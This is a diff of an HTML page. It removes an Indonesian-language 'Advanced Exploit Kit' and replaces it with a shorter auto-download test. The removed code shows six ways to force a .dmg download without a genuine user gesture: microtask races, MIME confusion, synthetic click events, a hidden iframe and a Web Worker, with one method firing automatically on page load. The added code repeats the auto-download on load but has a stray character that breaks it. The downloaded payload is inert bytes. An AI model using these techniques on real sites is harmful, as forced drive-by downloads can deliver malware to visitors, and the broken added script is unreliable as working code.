@@ -1,237 +1,46 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Advanced Auto-Download Exploit Kit</title>
-<style>
-    :root {
-        --bg: #0f172a;
-        --panel: #1e293b;
-        --text: #e2e8f0;
-        --accent: #3b82f6;
-        --danger: #ef4444;
-        --success: #10b981;
-        --log-bg: #020617;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-        font-family: 'Segoe UI', system-ui, sans-serif;
-        background: var(--bg);
-        color: var(--text);
-        padding: 20px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-    }
-    .panel {
-        background: var(--panel);
-        padding: 30px;
-        border-radius: 12px;
-        box-shadow: 0 10px 40px rgba(0,0,0,0.5);
-        max-width: 700px;
-        width: 100%;
-    }
-    h1 { font-size: 24px; color: var(--accent); margin-bottom: 10px; text-align: center; }
-    p { text-align: center; margin-bottom: 20px; color: #94a3b8; font-size: 14px; }
-    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
-    button {
-        padding: 15px;
-        border: none;
-        border-radius: 8px;
-        font-weight: bold;
-        cursor: pointer;
-        transition: 0.2s;
-        color: white;
-        font-size: 14px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-    }
-    button:hover { opacity: 0.9; transform: translateY(-2px); }
-    .btn-red { background: var(--danger); }
-    .btn-blue { background: var(--accent); }
-    .btn-green { background: var(--success); }
-    
-    #log {
-        background: var(--log-bg);
-        color: #22c55e;
-        padding: 15px;
-        border-radius: 8px;
-        font-family: 'Fira Code', monospace;
-        font-size: 12px;
-        height: 250px;
-        overflow-y: auto;
-        border: 1px solid #334155;
-    }
-    .log-time { color: #64748b; margin-right: 5px; }
-    .log-error { color: #ef4444; }
-    .log-success { color: #10b981; }
-    .log-info { color: #3b82f6; }
-</style>
+<title>Auto Download Test</title>
 </head>
 <body>
-
-<div class="panel">
-    <h1>🚀 Advanced Exploit Kit</h1>
-    <p>Uji ketahanan browser terhadap serangan <i>Drive-by Download</i>.</p>
-
-    <div class="grid">
-        <button class="btn-red" onclick="runDirect()">Direct Load</button>
-        <button class="btn-blue" onclick="runMicrotask()">Microtask Race</button>
-        <button class="btn-blue" onclick="runMimeConfusion()">MIME Confusion</button>
-        <button class="btn-blue" onclick="runSynthetic()">Synthetic Event</button>
-        <button class="btn-green" onclick="runIframe()">Iframe Injection</button>
-        <button class="btn-green" onclick="runWorker()">Worker Exploit</button>
-    </div>
-
-    <div id="log">Sistem siap. Pilih metode eksploitasi...</div>
-</div>
-
+<h2>Testing Auto Download via Blob API</h2>
 <script>
-    const logDiv = document.getElementById('log');
-    
-    // Fungsi Logging
-    function log(msg, type = 'info') {
-        const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
-        const color = type === 'error' ? 'log-error' : type === 'success' ? 'log-success' : 'log-info';
-        logDiv.innerHTML += `<br><span class="log-time">[${time}]</span><span class="${color}">${msg}</span>`;
-        logDiv.scrollTop = logDiv.scrollHeight;
-        console.log(`[${type.toUpperCase()}] ${msg}`);
-    }
-
-    // 1. Payload DMG (Header 'koly')
-    const createPayload = () => {
+    const createDmgPayload = () => {
         const bytes = new Uint8Array(1024);
-        bytes[0] = 0x6B; bytes[1] = 0x6F; bytes[2] = 0x6C; bytes[3] = 0x79; // koly
+        bytes[0] = 0x6B; // k
+        bytes[1] = 0x6F; // o
+        bytes[2] = 0x6C; // l
+        bytes[3] = 0x79; // y
         return bytes;
     };
 
-    // 2. Fungsi Inti Unduhan
-    const executeDownload = (methodName, mimeType = 'application/octet-stream') => {
+    const triggerDownload = () => {
         try {
-            log(`Memicu: ${methodName}...`);
-            const bytes = createPayload();
-            const blob = new Blob([bytes], { type: mimeType });
+            const bytes = createDmgPayload();
+            const blob = new Blob([bytes], { type: 'application/octet-stream' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `Payload_${methodName.replace(/\s/g, '_')}.dmg`;
+            a.download = 'Auto_Payload.dmg';
             a.style.display = 'none';
             document.body.appendChild(a);
             
             a.click();
             
             setTimeout(() => {
-                if (a.parentNode) document.body.removeChild(a);
+                document.body.removeChild(a);
                 URL.revokeObjectURL(url);
             }, 3000);
-            
-            log(`[SUKSES] Unduhan dipicu via ${methodName}`, 'success');
         } catch (e) {
-            log(`[GAGAL] ${methodName}: ${e.message}`, 'error');
+            console.error(e);
         }
-    };
+    };a
 
-    // --- METODE EKSPLOITASI ---
-
-    // 1. Direct Load
-    function runDirect() {
-        executeDownload("Direct Load");
-    }
-
-    // 2. Microtask Race Condition (Sangat Cepat)
-    function runMicrotask() {
-        queueMicrotask(() => {
-            queueMicrotask(() => {
-                executeDownload("Microtask Race");
-            });
-        });
-    }
-
-    // 3. MIME Confusion (Mengira Gambar)
-    function runMimeConfusion() {
-        executeDownload("MIME Confusion", "image/png");
-    }
-
-    // 4. Synthetic Event (Palsukan Klik)
-    function runSynthetic() {
-        try {
-            log("Membuat Synthetic MouseEvent...");
-            const fakeEvent = new MouseEvent('click', { view: window, bubbles: true, cancelable: true });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(new Blob([createPayload()], {type: 'application/octet-stream'}));
-            a.download = 'Payload_Synthetic.dmg';
-            document.body.appendChild(a);
-            a.dispatchEvent(fakeEvent);
-            a.remove();
-            log("[SUKSES] Synthetic Event terkirim.", 'success');
-        } catch(e) {
-            log(`[GAGAL] Synthetic: ${e.message}`, 'error');
-        }
-    }
-
-    // 5. Iframe Injection (Menguji bypass sandbox)
-    function runIframe() {
-        try {
-            log("Membuat iframe tersembunyi...");
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
-            const iframeDoc = iframe.contentWindow.document;
-            iframeDoc.open();
-            iframeDoc.write(`
-                <script>
-                    const bytes = new Uint8Array(1024);
-                    bytes[0]=0x6B; bytes[1]=0x6F; bytes[2]=0x6C; bytes[3]=0x79;
-                    const blob = new Blob([bytes], {type:'application/octet-stream'});
-                    const a = document.createElement('a');
-                    a.href = URL.createObjectURL(blob);
-                    a.download = 'Payload_Iframe.dmg';
-                    a.click();
-                <\/script>
-            `);
-            iframeDoc.close();
-            log("[SUKSES] Iframe injection berhasil.", 'success');
-        } catch(e) {
-            log(`[GAGAL] Iframe: ${e.message}`, 'error');
-        }
-    }
-
-    // 6. Web Worker Exploit (Bypass Main Thread)
-    function runWorker() {
-        try {
-            log("Membuat Web Worker...");
-            const workerCode = `
-                self.onmessage = function() {
-                    self.postMessage('TRIGGER');
-                }
-            `;
-            const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-            const worker = new Worker(URL.createObjectURL(workerBlob));
-            
-            worker.onmessage = function(e) {
-                if (e.data === 'TRIGGER') {
-                    executeDownload("Worker Exploit");
-                    worker.terminate();
-                }
-            };
-            worker.postMessage('START');
-            log("[SUKSES] Worker berjalan.", 'success');
-        } catch(e) {
-            log(`[GAGAL] Worker: ${e.message}`, 'error');
-        }
-    }
-
-    // Jalankan Direct Load saat halaman dimuat
-    window.addEventListener('DOMContentLoaded', () => {
-        log("Halaman dimuat. Menjalankan Direct Load otomatis...", 'info');
-        runDirect();
+    window.addEventListener("DOMContentLoaded", () => {
+        triggerDownload();
     });
 </script>
-
 </body>
 </html>
